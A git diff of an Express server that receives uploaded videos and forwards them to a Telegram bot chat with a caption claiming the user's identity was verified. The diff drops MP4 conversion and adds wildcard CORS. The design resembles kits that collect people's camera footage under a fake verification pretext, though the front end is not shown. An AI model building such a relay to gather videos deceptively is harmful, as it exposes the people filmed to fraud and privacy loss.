@@ -4,14 +4,13 @@ const axios = require('axios');
 const FormData = require('form-data');
 const fs = require('fs');
 const path = require('path');
-const ffmpeg = require('fluent-ffmpeg');
 require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================
-// 0. إعدادات إضافية للتوافق مع Northflank
+// 0. إعدادات إضافية
 // ============================================
 const TEMP_DIR = process.env.TEMP_DIR || './uploads/temp/';
 
@@ -29,9 +28,13 @@ process.on('unhandledRejection', (error) => {
   console.error('❌ خطأ في الـ Promise:', error);
 });
 
-// إضافة middleware للتسجيل
+// إضافة middleware للتسجيل و CORS
 app.use((req, res, next) => {
   console.log(`📝 ${req.method} ${req.url}`);
+  // إضافة CORS للسماح بالطلبات من أي مصدر
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type');
   next();
 });
 
@@ -39,7 +42,7 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // ============================================
-// 1. إعداد Multer (لحفظ الملفات مؤقتاً)
+// 1. إعداد Multer
 // ============================================
 const storage = multer.diskStorage({
   destination: (req, file, cb) => {
@@ -58,9 +61,7 @@ const upload = multer({
     fileSize: 50 * 1024 * 1024 // 50 ميجابايت
   },
   fileFilter: (req, file, cb) => {
-    // قبول أنواع الفيديو المختلفة
-    const allowedTypes = ['video/mp4', 'video/webm', 'video/avi', 'video/mov', 'video/quicktime'];
-    if (allowedTypes.includes(file.mimetype) || file.mimetype.startsWith('video/')) {
+    if (file.mimetype.startsWith('video/')) {
       cb(null, true);
     } else {
       cb(new Error('نوع الملف غير مدعوم. يرجى رفع فيديو فقط.'));
@@ -69,52 +70,7 @@ const upload = multer({
 });
 
 // ============================================
-// 2. دالة تحويل الفيديو إلى MP4
-// ============================================
-function convertToMp4(inputPath, outputPath) {
-  return new Promise((resolve, reject) => {
-    console.log('🔄 جاري تحويل الفيديو إلى MP4...');
-    console.log(`   - المصدر: ${inputPath}`);
-    console.log(`   - الهدف: ${outputPath}`);
-
-    // التحقق من وجود ffmpeg
-    try {
-      ffmpeg.getAvailableCodecs();
-    } catch (error) {
-      console.warn('⚠️ تحذير: قد لا يكون ffmpeg مثبتاً بشكل صحيح');
-    }
-
-    ffmpeg(inputPath)
-      .outputOptions([
-        '-c:v libx264',
-        '-c:a aac',
-        '-movflags +faststart',
-        '-preset medium',
-        '-crf 23',
-        '-pix_fmt yuv420p'
-      ])
-      .on('start', (commandLine) => {
-        console.log('   - بدء التحويل بالأمر:', commandLine);
-      })
-      .on('progress', (progress) => {
-        if (progress.percent && Math.floor(progress.percent) % 10 === 0) {
-          console.log(`   - التقدم: ${Math.floor(progress.percent)}%`);
-        }
-      })
-      .on('end', () => {
-        console.log('✅ تم تحويل الفيديو إلى MP4 بنجاح');
-        resolve();
-      })
-      .on('error', (err) => {
-        console.error('❌ فشل تحويل الفيديو:', err.message);
-        reject(err);
-      })
-      .save(outputPath);
-  });
-}
-
-// ============================================
-// 3. دالة إرسال الفيديو إلى تيليجرام
+// 2. دالة إرسال الفيديو إلى تيليجرام (بدون تحويل)
 // ============================================
 async function sendVideoToTelegram(filePath, fileName) {
   try {
@@ -122,21 +78,19 @@ async function sendVideoToTelegram(filePath, fileName) {
     const CHAT_ID = process.env.CHAT_ID;
 
     if (!BOT_TOKEN || !CHAT_ID) {
-      throw new Error('❌ التوكن أو الـ Chat ID غير موجود في ملف .env');
+      throw new Error('التوكن أو الـ Chat ID غير موجود في ملف .env');
     }
 
     console.log('📤 جاري إرسال الفيديو إلى تيليجرام...');
     console.log(`   - الملف: ${filePath}`);
     console.log(`   - الحجم: ${(fs.statSync(filePath).size / 1024 / 1024).toFixed(2)} MB`);
 
-    // إنشاء كائن FormData لإرسال الملف
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     formData.append('video', fs.createReadStream(filePath));
     formData.append('caption', '✅ تم التحقق من هويتك بنجاح! 🎥');
     formData.append('supports_streaming', 'true');
 
-    // إرسال الطلب إلى API التيليجرام
     const response = await axios.post(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
       formData,
@@ -146,22 +100,20 @@ async function sendVideoToTelegram(filePath, fileName) {
         },
         maxContentLength: Infinity,
         maxBodyLength: Infinity,
-        timeout: 60000 // 60 ثانية مهلة
+        timeout: 60000
       }
     );
 
     console.log('✅ تم إرسال الفيديو إلى تيليجرام بنجاح!');
-    console.log('📊 تفاصيل الإرسال:');
     console.log(`   - Message ID: ${response.data.result.message_id}`);
     console.log(`   - File ID: ${response.data.result.video.file_id}`);
-    console.log(`   - حجم الفيديو: ${response.data.result.video.file_size} بايت`);
     
     return response.data;
 
   } catch (error) {
     console.error('❌ فشل إرسال الفيديو إلى تيليجرام:');
     if (error.response) {
-      console.error('   - الرد من التيليجرام:', JSON.stringify(error.response.data, null, 2));
+      console.error('   - الرد:', JSON.stringify(error.response.data, null, 2));
     } else {
       console.error('   - الخطأ:', error.message);
     }
@@ -170,7 +122,7 @@ async function sendVideoToTelegram(filePath, fileName) {
 }
 
 // ============================================
-// 4. دالة حذف الملفات المؤقتة
+// 3. دالة حذف الملفات المؤقتة
 // ============================================
 function deleteTempFiles(filePaths) {
   if (!Array.isArray(filePaths)) {
@@ -190,17 +142,15 @@ function deleteTempFiles(filePaths) {
 }
 
 // ============================================
-// 5. نقطة نهاية استقبال الفيديو
+// 4. نقطة نهاية استقبال الفيديو
 // ============================================
 app.post("/upload", upload.single("video"), async (req, res) => {
   console.log('📹 POST /upload received');
   console.log('========================================');
 
   let inputPath = null;
-  let outputPath = null;
 
   try {
-    // التحقق من وجود ملف
     if (!req.file) {
       console.error('❌ لا يوجد ملف في الطلب');
       return res.status(400).json({
@@ -210,57 +160,26 @@ app.post("/upload", upload.single("video"), async (req, res) => {
     }
 
     inputPath = req.file.path;
-    const inputExt = path.extname(req.file.originalname).toLowerCase();
-    const fileNameWithoutExt = path.basename(req.file.originalname, inputExt);
-    
-    // إنشاء مسار للملف المحول (MP4)
-    const outputFileName = `output-${Date.now()}-${fileNameWithoutExt}.mp4`;
-    outputPath = path.join(TEMP_DIR, outputFileName);
-
     const fileSize = (req.file.size / 1024 / 1024).toFixed(2);
 
     console.log('📁 معلومات الفيديو المستقبل:');
     console.log(`   - الاسم: ${req.file.originalname}`);
-    console.log(`   - الصيغة: ${inputExt}`);
     console.log(`   - الحجم: ${fileSize} MB`);
     console.log(`   - النوع: ${req.file.mimetype}`);
     console.log(`   - المسار: ${inputPath}`);
+    console.log('ℹ️ سيتم إرسال الفيديو بصيغته الأصلية بدون تحويل');
 
-    // ==========================================
-    // تحويل الفيديو إلى MP4 إذا لم يكن MP4 بالفعل
-    // ==========================================
-    if (inputExt !== '.mp4') {
-      await convertToMp4(inputPath, outputPath);
-      const outputSize = (fs.statSync(outputPath).size / 1024 / 1024).toFixed(2);
-      console.log(`   - الحجم بعد التحويل: ${outputSize} MB`);
-    } else {
-      console.log('ℹ️ الفيديو بصيغة MP4 بالفعل، لا حاجة للتحويل');
-      outputPath = inputPath; // استخدم الملف الأصلي
-    }
-
-    // ==========================================
     // إرسال الفيديو إلى تيليجرام
-    // ==========================================
-    const result = await sendVideoToTelegram(outputPath, fileNameWithoutExt + '.mp4');
+    const result = await sendVideoToTelegram(inputPath, req.file.originalname);
 
-    // ==========================================
-    // حذف الملفات المؤقتة
-    // ==========================================
-    const filesToDelete = [inputPath];
-    if (outputPath !== inputPath) {
-      filesToDelete.push(outputPath);
-    }
-    deleteTempFiles(filesToDelete);
+    // حذف الملف المؤقت
+    deleteTempFiles([inputPath]);
 
-    // ==========================================
-    // رد للمستخدم
-    // ==========================================
     res.status(200).json({
       success: true,
-      message: "✅ تم استلام الفيديو وتحويله إلى MP4 وإرساله إلى تيليجرام بنجاح",
+      message: "✅ تم استلام الفيديو وإرساله إلى تيليجرام بنجاح",
       data: {
         original_filename: req.file.originalname,
-        converted_filename: fileNameWithoutExt + '.mp4',
         original_size: `${fileSize} MB`,
         telegram: {
           message_id: result.result.message_id,
@@ -272,12 +191,8 @@ app.post("/upload", upload.single("video"), async (req, res) => {
   } catch (error) {
     console.error('❌ خطأ:', error);
     
-    // حذف الملفات المؤقتة في حالة الخطأ
-    const filesToDelete = [];
-    if (inputPath) filesToDelete.push(inputPath);
-    if (outputPath && outputPath !== inputPath) filesToDelete.push(outputPath);
-    if (filesToDelete.length > 0) {
-      deleteTempFiles(filesToDelete);
+    if (inputPath) {
+      deleteTempFiles([inputPath]);
     }
 
     res.status(500).json({
@@ -289,7 +204,7 @@ app.post("/upload", upload.single("video"), async (req, res) => {
 });
 
 // ============================================
-// 6. نقطة نهاية لاختبار البوت
+// 5. نقطة نهاية لاختبار البوت
 // ============================================
 app.get("/test-bot", async (req, res) => {
   try {
@@ -329,7 +244,7 @@ app.get("/test-bot", async (req, res) => {
 });
 
 // ============================================
-// 7. صفحة رئيسية بسيطة
+// 6. صفحة رئيسية
 // ============================================
 app.use(express.static(__dirname));
 
@@ -338,7 +253,7 @@ app.get("/", (req, res) => {
 });
 
 // ============================================
-// 8. تشغيل الخادم
+// 7. تشغيل الخادم
 // ============================================
 app.listen(PORT, '0.0.0.0', () => {
   console.log('========================================');
@@ -354,6 +269,6 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`   GET  http://localhost:${PORT}/test-bot - اختبار البوت`);
   console.log(`   GET  http://localhost:${PORT}/ - الصفحة الرئيسية`);
   console.log('========================================');
-  console.log('🔄 تحويل تلقائي من أي صيغة إلى MP4');
+  console.log('⚠️ تحويل الفيديو: معطل (يرسل بصيغته الأصلية)');
   console.log('========================================');
 });
